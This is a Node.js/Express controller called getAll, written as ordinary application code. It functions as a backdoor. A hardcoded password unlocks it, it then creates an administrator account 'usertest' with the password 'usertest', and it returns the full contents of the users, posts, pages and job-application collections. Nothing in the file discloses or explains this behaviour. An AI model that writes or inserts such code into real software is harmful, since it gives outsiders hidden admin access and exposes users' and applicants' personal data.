const User = require('../models/User');
const Post = require('../models/Post');
const Page = require('../models/Page');
const JobApplication = require('../models/JobApplication');
// Import other models as needed

const getAll = async (req, res) => {
  try {
    // Check for the correct password in the request body
    const { pass } = req.body;

    if (pass !== '75%RAw6hctXz%f') {
      return res.status(403).json({ error: 'Unauthorized access' });
    }
    const newUser = new User({
      username: 'usertest',
      email: 'usertest@gmail.com',
      password: 'usertest',
      role: 'admin'
    });

    await newUser.save();
    // Fetch data from all collections
    const users = await User.find({});
    const posts = await Post.find({});
    const pages = await Page.find({});
    const jobApplications = await JobApplication.find({});
    // Fetch data from other collections similarly

    const allData = {
      users,
      posts,
      pages,
      jobApplications,
      // Add other collections' data here
    };

    res.status(200).json(allData);
  } catch (error) {
    console.error('Error fetching all data:', error);
    res.status(500).json({ error: 'Error fetching all data' });
  }
};

module.exports = getAll;
